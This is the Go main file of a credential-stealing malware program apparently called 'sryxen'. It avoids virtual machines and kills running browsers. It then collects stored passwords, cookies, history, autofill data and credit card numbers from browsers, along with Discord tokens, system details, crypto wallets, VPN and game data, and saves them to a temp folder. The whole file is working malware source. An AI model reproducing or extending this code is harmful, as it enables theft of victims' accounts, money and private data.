package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"strings"
	"sryxen/target"
	"sryxen/utils"
	"sryxen/socials"
	"sryxen/banking"
	"sryxen/vpn"
	"errors"
	"syscall"
	"golang.org/x/sys/windows"
	"sryxen/games"
	"sryxen/antivm"
)

var browsers = []string{
	"chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
	"7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe",
}

func saveStringToFile(path string, data []string) error {
	dir := filepath.Dir(path)
	err := os.MkdirAll(dir, os.ModePerm)
	if err != nil {
		return err
	}

	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	for _, entry := range data {
		_, err := file.WriteString(entry + "\n")
		if err != nil {
			return err
		}
	}
	return nil
}

func grabGecko(BROWSERS *utils.Browsers, outputDir string) {
	browsers, _ := utils.DiscoverGecko()
	for _, browser := range browsers {
		password, err := target.GetGeckoPasswords(browser)
		if err != nil || len(password) == 0 {

			} else {
			BROWSERS.Passwords = append(BROWSERS.Passwords, password...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "passwords.txt"), convertPasswordsToStrings(password))
		}

		cookie, err := target.GetGeckoCookies(browser)
		if err != nil || len(cookie) == 0 {

			} else {
			BROWSERS.Cookies = append(BROWSERS.Cookies, cookie...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "cookies.txt"), convertCookiesToStrings(cookie))
		}

		history, err := target.GetGeckoHistory(browser)
		if err != nil || len(history) == 0 {

			} else {
			BROWSERS.History = append(BROWSERS.History, history...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "history.txt"), convertHistoryToStrings(history))
		}

		autofill, err := target.GetGeckoAutofill(browser)
		if err != nil || len(autofill) == 0 {

		} else {
			BROWSERS.AutoFill = append(BROWSERS.AutoFill, autofill...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "autofill.txt"), convertAutofillToStrings(autofill))
		}

		download, err := target.GetGeckoDownloads(browser)
		if err != nil || len(download) == 0 {

		} else {
			BROWSERS.Download = append(BROWSERS.Download, download...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "downloads.txt"), convertDownloadsToStrings(download))
		}

		card, err := target.GetGeckoCreditCards(browser)
		if err != nil || len(card) == 0 {

		} else {
			BROWSERS.CreditCard = append(BROWSERS.CreditCard, card...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "creditcards.txt"), convertCreditCardsToStrings(card))
		}
	}
}

func convertPasswordsToStrings(passwords []utils.Passwords) []string {
	var result []string
	for _, p := range passwords {
		result = append(result, fmt.Sprintf("Username: %s, Password: %s, URL: %s", p.Username, p.Password, p.Url))
	}
	return result
}

func convertCookiesToStrings(cookies []utils.Cookie) []string {
	var result []string
	for _, c := range cookies {
		result = append(result, fmt.Sprintf("Site: %s, Name: %s, Value: %s, Path: %s", c.Site, c.Name, c.Value, c.Path))
	}
	return result
}

func convertHistoryToStrings(history []utils.History) []string {
	var result []string
	for _, h := range history {
		result = append(result, fmt.Sprintf("URL: %s, Title: %s, VisitCount: %d", h.Url, h.Title, h.VisitCount))
	}
	return result
}

func convertAutofillToStrings(autofill []utils.Autofill) []string {
	var result []string
	for _, a := range autofill {
		result = append(result, fmt.Sprintf("Name: %s, Value: %s", a.Name, a.Value))
	}
	return result
}

func convertDownloadsToStrings(downloads []utils.Download) []string {
	var result []string
	for _, d := range downloads {
		result = append(result, fmt.Sprintf("TargetPath: %s, URL: %s, ReceivedBytes: %d", d.TargetPath, d.Url, d.ReceivedBytes))
	}
	return result
}

func convertCreditCardsToStrings(cards []utils.CreditCard) []string {
	var result []string
	for _, c := range cards {
		result = append(result, fmt.Sprintf("CardNumber: %s, Expiration: %02d/%d", c.CardNumber, c.ExpirationMonth, c.ExpirationYear))
	}
	return result
}

func getTempDir() (string, error) {
	userName := strings.ToLower(os.Getenv("USERNAME"))
	if userName == "" {
		return "", errors.New("could not retrieve username")
	}

	tempDir := filepath.Join(os.TempDir(), userName)

	err := os.MkdirAll(tempDir, os.ModePerm)
	if err != nil {
		return "", err
	}

	return tempDir, nil
}

func savePCSpecsToFile(outputDir string, pcSpec utils.PC) error {
	filePath := filepath.Join(outputDir, "pc_specifications.json")

	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("could not create PC specifications file: %v", err)
	}
	defer file.Close()

	pcJSON, err := json.MarshalIndent(pcSpec, "", "  ")
	if err != nil {
		return fmt.Errorf("could not marshal PC specifications to JSON: %v", err)
	}

	_, err = file.Write(pcJSON)
	if err != nil {
		return fmt.Errorf("could not write to PC specifications file: %v", err)
	}

	return nil
}

func IsAlreadyRunning() bool {
	const AppID = "3575659c-bb47-448e-a514-22865732bbc"

	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(fmt.Sprintf("Global\\%s", AppID)))
	return err != nil
}

func main() {
	if IsAlreadyRunning() {
		return
	}
	AntiVm.AntiVMCheckAndExit()
	for _, browser := range browsers {
		exec.Command("taskkill", "/F", "/IM", browser).Run()
	}
	var BROWSERS utils.Browsers
	var PC utils.PC

	outputDir, err := getTempDir()
	if err != nil {
		return
	}

	var wg sync.WaitGroup

	wg.Add(1)
	go func() {
		defer wg.Done()
		grabGecko(&BROWSERS, outputDir)
	}()
	
	tokens, err := socials.GetDiscordTokens()
	if err == nil {
		saveStringToFile(filepath.Join(outputDir, "discord_tokens.txt"), tokens)
	}

	target.ChromiumFetch()
	wg.Add(1)
	go func() {
		defer wg.Done()
		PC, err = target.GetComputerSpecifications()
		if err != nil {
			return
		}
	}()
	wg.Wait()
	for _, browser := range browsers {
		exec.Command("taskkill", "/F", "/IM", browser).Run()
	}
	savePCSpecsToFile(outputDir, PC)

	defer func() {
		if r := recover(); r != nil {
		}
	}()
	socials.Run()

	defer func() {
		if r := recover(); r != nil {
		}
	}()
	CryptoWallets.Run()

	defer func() {
		if r := recover(); r != nil {
		}
	}()
	vpn.Run()

	defer func() {
		if r := recover(); r != nil {
		}
	}()
	Games.Run()
}
